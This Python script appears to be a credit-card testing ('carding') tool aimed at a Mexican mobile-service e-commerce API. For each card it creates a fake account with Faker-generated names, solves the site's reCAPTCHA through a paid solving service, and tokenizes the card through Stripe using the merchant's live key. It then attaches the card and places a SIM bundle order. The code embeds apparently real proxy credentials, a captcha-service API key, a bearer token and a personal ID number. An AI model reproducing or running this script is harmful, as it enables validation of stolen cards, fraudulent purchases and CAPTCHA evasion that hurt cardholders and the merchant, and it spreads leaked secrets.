from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b

from bs4 import BeautifulSoup

import json

import time
import re
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password

def procesar_tarjeta(card: str) -> str:   
    max_retries = 3
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            proxy_user = "package-322189-country-mx-region-yucatan-city-merida-isp-telmex+fibra"
            proxy_pass = "SKRo8Dkct0MlViur"
            proxy_host = "proxy.soax.com"
            proxy_port = 5000

            # Crear la URL del proxy
            proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

            # Crear sesión
            c = requests.Session()

            # Configurar proxy en la sesión
            proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            correos_disponibles = [
                'numero2quituk@gmail.com',
                'numero3quituk@gmail.com',
                'numero1quituk@gmail.com',
            ]
            elegido = random.choice(correos_disponibles)
            print(elegido)
            headers = {
                'accept': '*/*',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            params = {
                'imei': '353495111910597',
                'sim_card_type': 'embedded',
            }

            response = c.get('https://redphone.api.koonolmexico.com/altan/imei_check', params=params, headers=headers)
            headers = {
                'accept': '*/*',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJiNjVmMjhiYi02YjM0LTQyZjMtYTdhNy1mNTNmN2FhMTc0NGMifQ.eyOU-3ny_IKtA58El3ASh5s6iylLXLF4nFZhjra1uYc',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '25',
            }

            response = c.get('https://redphone.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)
            # Tu API key de CapMonster
            api_key = "5ce129ec4745149faf2ff1cc16166a71"

            # Sitio donde está el reCAPTCHA
            website_url = "https://www.redphone.com.mx/unete/"

            # Sitekey extraído del HTML del sitio (en el <div class="g-recaptcha" data-sitekey="...">)
            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"

            # Paso 1: Crear la tarea
            create_task_payload = {
                "clientKey": api_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",  # No usas proxy
                    "websiteURL": website_url,
                    "websiteKey": sitekey
                }
            }

            print("📤 Enviando captcha a CapMonster...")

            response = requests.post("https://api.capmonster.cloud/createTask", json=create_task_payload)
            result = response.json()

            if result.get("errorId") != 0:
                print("❌ Error al crear tarea:", result.get("errorCode"))
                exit()

            task_id = result["taskId"]
            print("🆔 Tarea creada con ID:", task_id)

            # Paso 2: Consultar la solución
            get_result_payload = {
                "clientKey": api_key,
                "taskId": task_id
            }

            for i in range(20):
                time.sleep(5)  # espera entre intentos
                res = requests.post("https://api.capmonster.cloud/getTaskResult", json=get_result_payload)
                res_json = res.json()

                if res_json.get("status") == "ready":
                    token = res_json["solution"]["gRecaptchaResponse"]
                    print("✅ CAPTCHA resuelto con éxito.")
                   
                    break
                else:
                    print(f"⏳ Esperando respuesta ({i+1}/20)...")

            else:
                print("❌ Tiempo de espera agotado.")
            
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJiNjVmMjhiYi02YjM0LTQyZjMtYTdhNy1mNTNmN2FhMTc0NGMifQ.eyOU-3ny_IKtA58El3ASh5s6iylLXLF4nFZhjra1uYc',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': name,
                    'last_name': last,
                    'maiden_name': '',
                    'email': 'numero122quituk@gmail.com',
                    'phone': None,
                    'mobile_phone': '99756632',
                    'google_recaptcha_token': token,
                    'curp': 'QUGR990915HYNTMD06',
                    'privacy_acceptance': True,
                },
            }

            response = c.post('https://redphone.api.koonolmexico.com/users', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            
            user_id = responsePm['user']['id']
            print(user_id)

            api_key = "5ce129ec4745149faf2ff1cc16166a71"

            # Sitio donde está el reCAPTCHA
            website_url = "https://www.redphone.com.mx/unete/"

            # Sitekey extraído del HTML del sitio (en el <div class="g-recaptcha" data-sitekey="...">)
            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"

            # Paso 1: Crear la tarea
            create_task_payload = {
                "clientKey": api_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",  # No usas proxy
                    "websiteURL": website_url,
                    "websiteKey": sitekey
                }
            }

            print("📤 Enviando captcha a CapMonster...")

            response = requests.post("https://api.capmonster.cloud/createTask", json=create_task_payload)
            result = response.json()

            if result.get("errorId") != 0:
                print("❌ Error al crear tarea:", result.get("errorCode"))
                exit()

            task_id = result["taskId"]
            print("🆔 Tarea creada con ID:", task_id)

            # Paso 2: Consultar la solución
            get_result_payload = {
                "clientKey": api_key,
                "taskId": task_id
            }

            for i in range(20):
                time.sleep(5)  # espera entre intentos
                res = requests.post("https://api.capmonster.cloud/getTaskResult", json=get_result_payload)
                res_json = res.json()

                if res_json.get("status") == "ready":
                    token = res_json["solution"]["gRecaptchaResponse"]
                    print("✅ CAPTCHA resuelto con éxito.")
                   
                    break
                else:
                    print(f"⏳ Esperando respuesta ({i+1}/20)...")

            else:
                print("❌ Tiempo de espera agotado.")
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=611176&pasted_fields=number&guid=ddaa8b59-5638-4619-91f7-781323976c71b62da2&muid=9bded0c3-f46a-4798-8a88-e2420982729f432df7&sid=7eccc1df-7d86-40b9-a9a9-fc057606201874362b&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            token_id = responsePm['id']
            print(token_id)
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJiNjVmMjhiYi02YjM0LTQyZjMtYTdhNy1mNTNmN2FhMTc0NGMifQ.eyOU-3ny_IKtA58El3ASh5s6iylLXLF4nFZhjra1uYc',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': None,
                    'openpay_device_session_id': 'Igh4K0L6hQvOH0rXHIcOuasG8GNu0syi',
                    'stripe_token': token_id,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': user_id,
            }

            response = c.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJiNjVmMjhiYi02YjM0LTQyZjMtYTdhNy1mNTNmN2FhMTc0NGMifQ.eyOU-3ny_IKtA58El3ASh5s6iylLXLF4nFZhjra1uYc',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            json_data = {
                'altan_service_bundle_order': {
                    'user_id': user_id,
                    'payment_method': 'card',
                    'concept': 'bundle',
                    'latitude': 20.5964312,
                    'longitude': -100.388084,
                    'recurring_payments': False,
                    'payment_plan': None,
                    'nir': None,
                    'code': None,
                    'admin_id': None,
                    'promoter_code': None,
                    'dpcard_number': None,
                    'activation_code_qr_file_url': None,
                    'source_type': 'e_commerce',
                    'sim_card_type': None,
                    'google_recaptcha_token': token,
                    'bundle_id': '25',
                },
                'user_id': user_id,
            }

            response = c.post('https://redphone.api.koonolmexico.com/altan_service_bundle_orders', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            print(responsePm)

            print(response)

        except Exception as e:
            print(e)
            retry_count += 1
    else:

        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}






